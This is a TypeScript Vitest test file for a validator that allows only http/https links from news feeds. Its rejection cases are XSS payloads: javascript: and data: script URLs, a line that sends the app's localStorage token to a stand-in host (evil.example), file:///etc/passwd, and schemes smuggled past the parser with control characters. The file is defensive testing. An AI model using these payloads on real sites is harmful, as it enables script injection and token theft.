import { describe, expect, it } from 'vitest';
import { safeFeedUrl, validateFeedUrl } from './feed-url';

/**
 * Feed link validation.
 *
 * Every rejection below was previously passed straight through to
 * `<a href={item.url}>` in the browser.
 */

describe('validateFeedUrl — accepts real feed links', () => {
  const valid = [
    'https://economictimes.indiatimes.com/markets/stocks/news/some-headline/articleshow/12345.cms',
    'https://www.moneycontrol.com/news/business/markets/story-1234.html',
    'http://example.com/article',
    'https://example.com/path?utm_source=rss&utm_medium=feed#section',
    // Unencoded space in a query string: the parser encodes it rather than
    // stripping it, so it cannot forge a scheme and is allowed through.
    'https://example.com/search?q=nifty 50',
  ];

  for (const url of valid) {
    it(`accepts ${url.slice(0, 60)}`, () => {
      const result = validateFeedUrl(url);
      expect(result.ok).toBe(true);
      if (!result.ok) return;
      expect(['http:', 'https:']).toContain(result.protocol);
    });
  }

  it('trims surrounding whitespace and returns the normalised URL', () => {
    const result = validateFeedUrl('  https://example.com/a  ');
    expect(result).toEqual({ ok: true, url: 'https://example.com/a', protocol: 'https:' });
  });

  it('accepts an uppercase scheme, normalised to lowercase', () => {
    const result = validateFeedUrl('HTTPS://example.com/a');
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.protocol).toBe('https:');
  });
});

describe('validateFeedUrl — rejects script-bearing schemes', () => {
  // Each of these, rendered into an href and clicked, executes in the app origin
  // — which holds the API bearer token in localStorage.
  const dangerous = [
    'javascript:alert(document.domain)',
    "javascript:fetch('https://evil.example/'+localStorage.getItem('tradew_token'))",
    'JavaScript:alert(1)',
    '  javascript:alert(1)  ',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
    'blob:https://example.com/550e8400-e29b-41d4-a716-446655440000',
    'file:///etc/passwd',
    'file:///C:/Windows/win.ini',
  ];

  for (const url of dangerous) {
    it(`rejects ${url.slice(0, 48)}`, () => {
      const result = validateFeedUrl(url);
      expect(result.ok).toBe(false);
      if (result.ok) return;
      expect(result.reason).toBe('disallowed_scheme');
      expect(safeFeedUrl(url)).toBeNull();
    });
  }

  it('rejects unknown and future schemes by default (allowlist, not denylist)', () => {
    for (const url of [
      'filesystem:https://example.com/temporary/x',
      'chrome-extension://abcdef/page.html',
      'ftp://example.com/file.txt',
      'mailto:someone@example.com',
      'tel:+911234567890',
      'ws://example.com/socket',
      'some-scheme-invented-in-2030://example.com/',
    ]) {
      expect(validateFeedUrl(url).ok).toBe(false);
    }
  });

  it('rejects a scheme smuggled past the parser with control characters', () => {
    // The WHATWG parser strips TAB/LF/CR, so these normalise into a working
    // javascript: URL. Rejected on the raw string, before parsing.
    for (const url of [
      'java\tscript:alert(1)',
      'java\nscript:alert(1)',
      'java\rscript:alert(1)',
      'javascript\u0000:alert(1)',
    ]) {
      const result = validateFeedUrl(url);
      expect(result.ok).toBe(false);
      if (result.ok) return;
      expect(result.reason).toBe('control_characters');
    }
  });
});

describe('validateFeedUrl — rejects malformed input', () => {
  it('rejects strings that are not URLs at all', () => {
    for (const value of ['not a url', '//example.com/protocol-relative', '/relative/path', 'example.com', 'http:', '???']) {
      const result = validateFeedUrl(value);
      expect(result.ok).toBe(false);
      if (result.ok) return;
      expect(['malformed', 'disallowed_scheme', 'no_host']).toContain(result.reason);
    }
  });

  it('rejects a scheme with nothing after it', () => {
    // Note what does NOT happen here: `http:///just/a/path` is NOT hostless.
    // For special schemes the WHATWG parser collapses the extra slashes and
    // re-reads the first path segment as the host, so it parses as
    // host `just`, path `/a/path` — a valid, if odd, URL. The `no_host` branch is
    // therefore unreachable for http/https and is documented as an invariant
    // guard rather than a live check.
    expect(validateFeedUrl('http://').ok).toBe(false);
    expect(validateFeedUrl('https://').ok).toBe(false);
  });

  it('rejects empty and whitespace-only values', () => {
    expect(validateFeedUrl('')).toEqual({ ok: false, reason: 'empty' });
    expect(validateFeedUrl('    ')).toEqual({ ok: false, reason: 'empty' });
  });

  it('rejects non-string input rather than coercing it', () => {
    for (const value of [null, undefined, 42, {}, [], true]) {
      expect(validateFeedUrl(value)).toEqual({ ok: false, reason: 'not_a_string' });
    }
  });

  it('rejects an absurdly long URL', () => {
    const result = validateFeedUrl(`https://example.com/${'a'.repeat(4000)}`);
    expect(result).toEqual({ ok: false, reason: 'too_long' });
  });
});

describe('safeFeedUrl', () => {
  it('returns the normalised URL or null, which is what parseRss consumes', () => {
    expect(safeFeedUrl('https://example.com/a')).toBe('https://example.com/a');
    expect(safeFeedUrl('javascript:alert(1)')).toBeNull();
    expect(safeFeedUrl(undefined)).toBeNull();
  });
});
